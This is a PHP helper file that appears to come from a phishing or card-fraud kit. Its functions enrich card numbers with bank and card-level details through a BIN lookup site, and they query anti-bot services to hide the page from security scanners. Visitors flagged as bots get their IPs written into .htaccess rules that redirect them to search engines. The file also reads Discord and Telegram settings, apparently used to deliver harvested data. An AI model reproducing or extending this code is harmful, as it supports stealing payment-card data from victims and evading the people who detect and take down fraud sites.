<?php
function _time()
{
    $timezone = new DateTimeZone('Asia/Jakarta');
    $date = new DateTime();
    $date->setTimeZone($timezone);
    $time = $date->format('H:i A');

    return $time;
}

function _date()
{
    $timezone = new DateTimeZone('Asia/Jakarta');
    $date = new DateTime();
    $date->setTimeZone($timezone);
    $fullday = $date->format('H:i A - D, d M Y');

    return $fullday;
}

function write($filename, $mode, $data)
{
    $fp = @fopen($filename, $mode);
    @fwrite($fp, $data);
    @fclose($fp);
}

function look_bin($num)
{
    error_reporting(0);

    $num    = str_replace(' ', '', trim($num));
    $num    = substr($num, 0, 6);

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'http://bins.su/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "action=searchbins&bins=$num&bank=&country=");
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $headers = array();
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Accept-Language: en-US,en;q=0.9';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'Origin: http://bins.su';
    $headers[] = 'Referer: http://bins.su/';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }
    curl_close($ch);


    $pattern = '/<\/tr><tr><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<.td><td>(.*?)<\/td>/s';
    preg_match($pattern, $result, $matches, PREG_OFFSET_CAPTURE, 3);

    $brand   = ($matches[3][0] ? $matches[3][0] : "unknown brand");
    $type    = ($matches[4][0] ? $matches[4][0] : "unknown type");
    $level   = ($matches[5][0] ? $matches[5][0] : "unknown level");
    $bank    = ($matches[6][0] ? $matches[6][0] : "unknown bank");
    $data    = strtoupper($num . " " . $brand . " " . $type . " " . $level . " " . $bank);

    return $data;
}
function product()
{
    $data = file_get_contents("#");
    $products = json_decode($data, true);
    return $products;
}
function SiNGFO($name)
{
    $get = parse_ini_file(FCPATH . "Get/ScriptInfo.ini");
    return $get[$name];
}
function kontak()
{
    $data = file_get_contents("#");
    $products = json_decode($data, true);
    return $products;
}

function curl($url, $hasHeader = false, $hasBody = true, $useragent = NULL, $time = NULL)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3");

    curl_setopt($ch, CURLOPT_HEADER, $hasHeader ? 1 : 0);
    curl_setopt($ch, CURLOPT_NOBODY, $hasBody ? 0 : 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_0);


    if (!is_null($time))
        curl_setopt($ch, CURLOPT_TIMEOUT, $time);
    if (!is_null($time))
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $time);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}

function write_php_ini($array, $file)
{
    $res = array();
    foreach ($array as $key => $val) {

        if (is_array($val)) {
            $res[] = "[$key]";
            foreach ($val as $skey => $sval) $res[] = "$skey = " . (is_numeric($sval) ? $sval : '"' . $sval . '"');
        } else $res[] = "$key = " . (is_numeric($val) ? $val : '"' . $val . '"');
    }

    safefilerewrite($file, implode("\r\n", $res));
}

function safefilerewrite($fileName, $dataToSave)
{

    if ($fp = fopen($fileName, 'w')) {
        $startTime = microtime(TRUE);

        do {
            $canWrite = flock($fp, LOCK_EX);
            if (!$canWrite) usleep(round(rand(0, 100) * 1000));
        } while ((!$canWrite) and ((microtime(TRUE) - $startTime) < 5));

        if ($canWrite) {
            fwrite($fp, $dataToSave);
            flock($fp, LOCK_UN);
        }

        fclose($fp);
    }
}

function _404($message)
{
    echo "
    <!DOCTYPE html>
<html lang=\"en\">

<head>
	<meta charset=\"utf-8\">
	<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">
	<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">

	<title>404</title>
	<link href=\"https://fonts.googleapis.com/css?family=Kanit:200\" rel=\"stylesheet\">
	<link type=\"text/css\" rel=\"stylesheet\" href=\"" . base_url() . "Assets/Panel/css/font-awesome.min.css\" />
	<link type=\"text/css\" rel=\"stylesheet\" href=\"" . base_url() . "Assets/Panel/css/style.css\" />

</head>

<body>

	<div id=\"notfound\">
		<div class=\"notfound\">
			<div class=\"notfound-404\">
				<h1>404</h1>
			</div>
			<h2>Oops! Nothing was found</h2>
			<p>" . $message . ".</p>
		</div>
	</div>

</body>

</html>";
}

function view($view, $params = [])
{
    if (strncmp($view, '/', 1) !== 0) {
        $view = FCPATH . 'Views/' . $view . ".php";
    }

    if (is_file($view . '.php')) {
        $view .= '.php';
    }

    return renderFile($view, $params);
}

function renderFile($_file_, $_params_ = [])
{
    ob_start();
    ob_implicit_flush(false);
    extract($_params_, EXTR_OVERWRITE);
    require($_file_);

    return ob_get_clean();
}

function base_url()
{
    $base_url = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == "on") ? "https" : "http");
    $base_url .= "://" . @$_SERVER['HTTP_HOST'];
    $base_url .= str_replace(basename($_SERVER['SCRIPT_NAME']), "", $_SERVER['SCRIPT_NAME']);

    return $base_url;
}
function _redirect($name)
{
    $get = parse_ini_file(FCPATH . "Get/redirect.ini");
    return $get[$name];
}

function _geoGet($ip_address)
{
    $url               = "http://ip-api.com/json/" . $ip_address;
    $getGeo            = json_decode(curl($url, false, true), 1);

    return $getGeo;
}

function _blocks()
{
    return write(FCPATH . '.htaccess', 'a', "\r\nRewriteCond %{REMOTE_ADDR} ^" . $_SERVER['REMOTE_ADDR'] . "$\r\nRewriteRule .* " . uriRand() . " [R,L]\r\n");
}
function uriRand()
{
    $uri = [
        'https://www.google.com',
        'https://www.bing.com',
        'https://www.yahoo.com',
        'https://www.duckduckgo.com',
        'https://www.wikipedia.org',
    ];

    shuffle($uri);
    return $uri[0];
}

function redirect($uri = '', $method = 'auto', $code = NULL)
{
    if (!preg_match('#^(\w+:)?//#i', $uri)) {
        $uri = base_url($uri);
    }

    if ($method === 'auto' && isset($_SERVER['SERVER_SOFTWARE']) && strpos($_SERVER['SERVER_SOFTWARE'], 'Microsoft-IIS') !== FALSE) {
        $method = 'refresh';
    } elseif ($method !== 'refresh' && (empty($code) or !is_numeric($code))) {

        if (isset($_SERVER['SERVER_PROTOCOL'], $_SERVER['REQUEST_METHOD']) && $_SERVER['SERVER_PROTOCOL'] === 'HTTP/1.1') {
            $code = ($_SERVER['REQUEST_METHOD'] !== 'GET')
                ? 303
                : 307;
        } else {
            $code = 302;
        }
    }

    switch ($method) {

        case 'refresh':
            header('Refresh:0;url=' . $uri);
            break;

        default:
            header('Location: ' . $uri, TRUE, $code);
            break;
    }

    exit;
}
function loadWhitelist($file) {
    if (!file_exists($file)) return [];
    return array_map('trim', file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
}
function _config($name)
{
    $get = parse_ini_file(FCPATH . "admin/panel.ini");
    return $get[$name];
}

function _antibot($name)
{
    $get = parse_ini_file(FCPATH . "admin/panel.ini");
    return $get[$name];
}

function _killbot($name)
{
    $get = parse_ini_file(FCPATH . "admin/panel.ini");
    return $get[$name];
}
function discord($key)
{
    static $discordConfig = null;
    if ($discordConfig === null) {
        $discordConfig = parse_ini_file(FCPATH . "admin/panel.ini");
    }
    return isset($discordConfig[$key]) ? $discordConfig[$key] : null;
}
function tel($name)
{
    $get = parse_ini_file(FCPATH . "admin/panel.ini");
    return $get[$name];
}

function ccMasking($number)
{
    return substr($number, 0, 0) . substr($number, -4);
}

function antibot($ip, $useragent)
{
    $key = _antibot('ANTIBOTKEY');
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_USERAGENT, "Antibot Blocker");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, "https://antibot.pw/api/v2-blockers?ip=" . $ip . "&apikey=" . $key . "&ua=" . urlencode($useragent) . "");
    $data = curl_exec($ch);
    curl_close($ch);
    $check = json_decode($data, 1);

    if ($check['is_bot'] == true) {
        return true;
    } else {
        return false;
    }
}

function botblocker($ip, $useragent)
{
    $key = _botblocker('BLOCKERPROKEY');
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_USERAGENT, "BotBlocker");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, "https://botblocker.pro/api/v1/blocker?ip=" . $ip . "&apikey=" . $key . "&ua=" . urlencode($useragent) . "&url=" . urlencode($_SERVER['REQUEST_URI']));
    
    $data = curl_exec($ch);
    curl_close($ch);
    $json = json_decode($data, true); 
    $acode = $json['meta']['code'];
    $blocked = $json['data'] == true ? $json['data']['is_bot'] : $json['data']['block_access'];
    if ($acode == 200 && $blocked) {
        return true;
    } else {
        return false;
    }
}


function blackbox($ip)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://blackbox.ipinfo.app/lookup/" . $ip);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $resp = curl_exec($ch);
    curl_close($ch);
    $result = $resp;

    if ($result == "Y") {
        return true;
    } else {
        return false;
    }
}